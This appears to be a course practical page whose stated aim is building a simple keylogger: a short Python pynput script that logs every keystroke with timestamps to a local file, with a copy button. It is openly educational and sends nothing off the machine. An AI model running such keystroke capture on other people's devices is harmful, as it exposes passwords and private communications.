<div class="container"><h1>PRACTICAL NO. 9</h1><h2>Aim: - Create a simple keylogger using python</h2><p><b>Code:</b> Python code shown below from the practical PDF.</p><textarea id="code9" rows="10" readonly>from pynput.keyboard import Key, Listener
import logging
# if no name it gets into an empty string
log_dir = &quot;&quot;
# This is a basic logging function
logging.basicConfig(filename=(log_dir+&quot;key_log.txt&quot;), level=logging.DEBUG,
format=&#x27;%(asctime)s:%(message)s:&#x27;)
# This is from the library
def on_press(key):
        logging.info(str(key))
# This says, listener is on
with Listener(on_press=on_press) as listener:
        listener.join()</textarea><button onclick="copyCode('code9', this)">📋 Copy</button><a href="index.html" class="back-btn">⬅ Back to Home</a></div>

<script>
function copyCode(id, btn) {
    const text = document.getElementById(id).value;
    navigator.clipboard.writeText(text).then(() => {
        btn.innerText = "✅ Copied!";
        setTimeout(() => { btn.innerText = "📋 Copy"; }, 2000);
    }).catch(() => {
        document.getElementById(id).select();
        document.execCommand("copy");
        btn.innerText = "✅ Copied!";
        setTimeout(() => { btn.innerText = "📋 Copy"; }, 2000);
    });
}
</script>
